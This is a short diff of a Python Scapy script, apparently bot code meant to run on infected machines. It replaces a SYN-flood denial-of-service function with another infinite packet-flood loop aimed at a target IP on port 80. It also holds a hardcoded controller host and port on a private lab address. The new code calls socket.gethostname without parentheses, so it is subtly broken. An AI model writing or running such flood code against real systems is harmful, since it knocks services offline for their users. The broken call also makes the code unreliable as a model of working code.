@@ -14,13 +14,14 @@ from scapy.all import *
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
 def ddos(target_IP):
-    tcp = TCP(sport=RandShort(), dport=80, flags="S")
-    ip = IP(dst=target_IP)
-
-
-    raw = Raw(b"X"*4096)
-    p = ip / tcp / raw
-    send(p, loop=1, verbose = 0)
+    source_IP = socket.gethostbyname(socket.gethostname)
+    source_port = 80
+    
+    while True:
+        IP1 = IP(src = source_IP, dst = target_IP)
+        TCP1 = TCP(sport = source_port, dport = 80)
+        pkt = IP1 / TCP1
+        send(pkt, inter = .001)
 
 HOST = "192.168.56.103"
 PORT = 1234
